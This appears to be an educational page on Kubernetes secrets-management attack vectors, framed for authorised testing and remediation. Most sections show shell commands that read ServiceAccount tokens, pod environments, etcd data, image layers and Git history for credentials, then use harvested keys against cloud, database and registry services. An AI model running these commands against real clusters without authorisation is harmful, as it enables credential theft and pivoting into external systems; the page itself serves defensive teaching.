# K08: Secrets Management Failures - Attack Vectors

## Table of Contents
- [Understanding Secrets Attack Vectors](#understanding-secrets-attack-vectors)
- [Core Attack Flow](#core-attack-flow)
- [Common Attack Patterns](#common-attack-patterns)
- [Chaining Secrets Failures](#chaining-secrets-failures)

## Understanding Secrets Attack Vectors

> **⚠ EDUCATIONAL PURPOSE ONLY** — the techniques below are shown so you can find and fix these issues in clusters you own or are authorised to test.

Attacking secrets is rarely about breaking cryptography. It is about **finding the copy that was never protected**: a value in etcd that was never encrypted, an env var in a pod spec, a key in an image layer, a password in Git history, a token mounted into a container that got popped. Because the same secret is copied across so many places, an attacker only needs to reach the weakest copy.

The attacker's goal in this category is usually one of:

- Read secret material directly from where it is stored (etcd, the Secret object, a manifest, an image, a repo).
- Read it from where it is *used* (a pod's environment, mounted files, logs, or crash output) after landing code execution in a workload.
- Use a harvested credential—especially a ServiceAccount token—to reach more secrets or pivot outside the cluster.

### Core Attack Flow

```
1. Locate
   ↓
   Where do secrets live? etcd, Secret API, env vars, images, Git, CI logs
2. Access
   ↓
   Reach the weakest copy: a token, a snapshot, a public image, a commit
3. Extract
   ↓
   Decode base64, dump env, pull image layers, read etcd, grep history
4. Escalate / Pivot
   ↓
   Use creds against DBs, cloud APIs, registries; list more secrets via RBAC
```

## Common Attack Patterns

### 1. Read Secrets Through the API With a Permissive Token

An identity (a user, or a compromised pod's ServiceAccount) that can `get`/`list` secrets reads them directly—base64 is no obstacle.

```bash
# From a workload with a token that can read secrets:
$ kubectl get secrets -A
$ kubectl get secret db-creds -o jsonpath='{.data.password}' | base64 -d
SuperSecret123

# Confirm what the current identity is allowed to do:
$ kubectl auth can-i list secrets --all-namespaces
yes
```

**Payoff**: cluster- or namespace-wide credential disclosure with a single, ordinary API call. No exploit—just excess permission.

### 2. Harvest the Automounted ServiceAccount Token

By default every pod mounts its ServiceAccount token. Code execution in a container hands the attacker that identity for free.

```bash
# Inside a compromised pod:
$ cat /var/run/secrets/kubernetes.io/serviceaccount/token
$ APISERVER=https://kubernetes.default.svc
$ TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
$ curl -sk -H "Authorization: Bearer $TOKEN" \
       $APISERVER/api/v1/namespaces/default/secrets
```

**Payoff**: a ready-made API credential. If the ServiceAccount can read secrets, the pod compromise becomes a secrets breach.

### 3. Dump Secrets From the Pod Environment

Secrets injected as environment variables are visible to anything running in—or able to inspect—the pod.

```bash
# If you can exec, or run code, in the pod:
$ env | grep -iE 'PASS|TOKEN|KEY|SECRET'
$ cat /proc/1/environ | tr '\0' '\n'

# Even without exec, the pod spec exposes hardcoded env values:
$ kubectl get pod web-abc -o yaml | grep -A2 'DB_PASSWORD'
```

**Payoff**: env vars also surface in crash dumps, APM/error trackers, and debug logs—so the same secret leaks through several side channels at once.

### 4. Read etcd or an etcd Snapshot Directly

If etcd has no encryption-at-rest, its on-disk data—and any backup or snapshot—contains Secret values in plaintext.

```bash
# On an etcd node / from a snapshot, values come out in the clear:
$ ETCDCTL_API=3 etcdctl --endpoints=127.0.0.1:2379 \
    get /registry/secrets/ --prefix --keys-only
$ ETCDCTL_API=3 etcdctl get /registry/secrets/default/db-creds
...
SuperSecret123

# A stolen snapshot is just as good:
$ strings snapshot.db | grep -i password
```

**Payoff**: one artifact yields every secret in the cluster. Unprotected snapshots in backup buckets are a favourite target.

### 5. Extract Secrets From Container Images

Secrets baked in at build time persist in image layers and are recovered offline.

```bash
# Pull and inspect layer history and filesystem:
$ docker history --no-trunc myregistry/app:latest   # ENV / build args leak here
$ docker save myregistry/app:latest -o app.tar && tar xf app.tar
$ grep -rIE 'AKIA|BEGIN PRIVATE KEY|password=' ./     # search unpacked layers

# A copied .git or .env directory is a common find:
$ find . -name '.env' -o -name '*.pem'
```

**Payoff**: durable credentials that never expire on their own; exposure lasts as long as the image exists anywhere.

### 6. Mine Git History for Committed Secrets

Manifests, Helm values, and ConfigMaps with plaintext secrets live forever in history, even after a "removing secret" commit.

```bash
# The current tree looks clean, but history does not:
$ git log -p -S 'password' -- '*.yaml'
$ git rev-list --all | xargs -I{} git grep -I 'AKIA' {} 2>/dev/null

# Automated tooling does this at scale across forges:
$ trufflehog git file://./repo
$ gitleaks detect --source .
```

**Payoff**: credentials harvested with off-the-shelf tools; public repos are scanned continuously and exposed keys are abused within minutes.

### 7. Read Secrets From ConfigMaps and "Config"

ConfigMaps carry no confidentiality semantics, yet routinely hold connection strings and tokens.

```yaml
$ kubectl get configmap app-config -o yaml
data:
  DATABASE_URL: "postgres://app:SuperSecret123@db:5432/prod"
  API_BASE: "https://api.internal?token=eyJ..."
```

**Payoff**: secrets sitting in objects that are often granted broader read access than Secrets, with no encryption story at all.

### 8. Scrape Secrets From CI/CD and Application Logs

Build steps and verbose apps echo secrets into logs that many people can read.

```bash
# Build log:
$ echo "Deploying with DB_PASSWORD=$DB_PASSWORD"   # printed into pipeline output
# App log on startup:
level=debug msg="connecting" dsn="postgres://app:SuperSecret123@db:5432/prod"
```

**Payoff**: pipeline and log viewers become credential viewers; log aggregation then fans the secret out to everyone with dashboard access.

### 9. Abuse Stale, Never-Rotated Credentials

Because the same long-lived secret has shipped unchanged for a long time, a copy captured at any point still works.

```bash
# A token or key found in an old image, snapshot, or commit still authenticates:
$ aws sts get-caller-identity     # the leaked key is still valid
$ psql "postgres://app:SuperSecret123@db:5432/prod" -c '\dt'
```

**Payoff**: no rotation means old leaks never "age out"—an attacker's captured copy remains a live credential.

### 10. Pivot Outside the Cluster With Harvested Cloud Credentials

Many cluster secrets are credentials for external systems, so reading one secret reaches far beyond Kubernetes.

```bash
# A registry pull secret, cloud key, or DB password read from the cluster:
$ cat /var/run/secrets/.../aws-creds
$ aws s3 ls                       # now enumerating cloud storage
$ docker login myregistry -u _ -p "$PULL_TOKEN"   # pull private images
```

**Payoff**: the blast radius extends to cloud accounts, databases, and registries—systems the cluster merely talks to.

## Chaining Secrets Failures

Individually small mistakes combine into full compromise:

```
Automounted SA token in a popped pod   -> identity for the API server
        +
RBAC allows list secrets namespace-wide -> read every Secret nearby
        +
A Secret holds a cloud IAM key          -> assume that identity in the cloud
        =  cluster foothold becomes a cloud-account breach
```

Another common chain:

```
Public image layer leaks a Git token   -> clone the private config repo
        -> history contains a kubeconfig / DB password
        -> connect directly to the datastore, no cluster access needed
        =  full data exposure from a single leaked image
```

## Key Takeaways

1. **Attackers hunt copies, not ciphertext**—the weakest copy of a secret (env var, image layer, commit, snapshot) is the one they take.
2. **The automounted token is a gift**—a popped pod inherits an API identity; if it can read secrets, the breach cascades.
3. **base64 and ConfigMaps hide nothing**—anything readable is readable in the clear.
4. **Permanence is the enemy**—images, Git history, and snapshots keep leaked secrets valid until they are rotated.
5. **Secrets reach outward**—one cluster credential frequently unlocks databases, registries, and cloud accounts.

## Next Steps

- **[Prevention Guide](prevention.md)**: Encryption-at-rest, external managers, least-privilege, and rotation
- **[Code Examples](examples.md)**: Insecure vs. secure secret handling side by side
- **[Kubernetes Learning Path](/learn/kubernetes)**: Continue the OWASP Kubernetes Top 10
- **[Practice](/practice)**: Apply what you've learned in hands-on exercises
